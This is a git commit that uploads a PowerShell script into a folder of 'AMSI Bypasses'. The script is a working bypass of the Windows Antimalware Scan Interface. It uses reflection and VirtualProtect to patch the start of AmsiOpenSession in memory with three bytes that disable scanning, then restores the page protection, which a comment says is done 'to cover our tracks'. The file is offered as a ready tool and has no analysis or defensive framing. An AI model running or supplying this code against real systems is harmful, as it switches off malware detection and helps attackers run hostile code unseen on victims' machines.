db4f102578941b8522174d5d2954c6417555af24
trike33 <137085374+trike33@users.noreply.github.com>
2023-06-20 16:55:11 +0000

    Add files via upload

---
+++ AMSI Bypasses/PowerShell/AmsiOpenSession_bypass_powershellreflect.ps1
@@ -0,0 +1,50 @@
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+#Resolving AmsiOpenSession(amsi.dll) and VirtualProtect(kernel32.dll) addresses to modify the AmsiOpenSession permisions to PAGE_EXECUTE_READWRITE/PAGE_EXECUTE_READCOPY, hex value(0x40) 
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+
+#Overwritting AmsiOpenSession header
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+
+#Changing again the permisions of AmsiOpenSession to PAGE_EXECUTE_READ, hex value(0x20) to cover our tracks
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+
